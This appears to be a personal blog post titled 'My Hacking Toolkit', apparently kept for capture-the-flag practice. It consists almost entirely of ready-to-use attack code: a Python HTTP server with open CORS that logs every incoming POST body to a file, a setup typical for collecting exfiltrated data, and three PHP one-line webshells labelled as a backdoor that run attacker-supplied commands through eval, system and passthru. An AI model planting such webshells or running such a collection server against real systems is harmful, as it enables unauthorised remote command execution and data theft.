---
abbrlink: 4e56d65
categories:
- - Hacking
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/9/Blog_cover%20(17)%20(1)_3e1f0c91c61253af1f2670f4341e7d33.jpg
date: '2024-09-03T23:50:41.047232+08:00'
tags: []
title: My Hacking Toolkit
updated: '2024-09-04T12:15:34.285+08:00'
---
# Temp Server (Python)

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

# One-liner Trojan (Backdoor, Webshell)

```php
<?php @eval($_POST['shell']);?>
<?php @system($_POST["cmd"])?>
<?php passthru($_GET['cmd']); ?>
```

# Hash Collision

- [Hash Collisions](https://github.com/CX330Blake/Hash-Collisions/)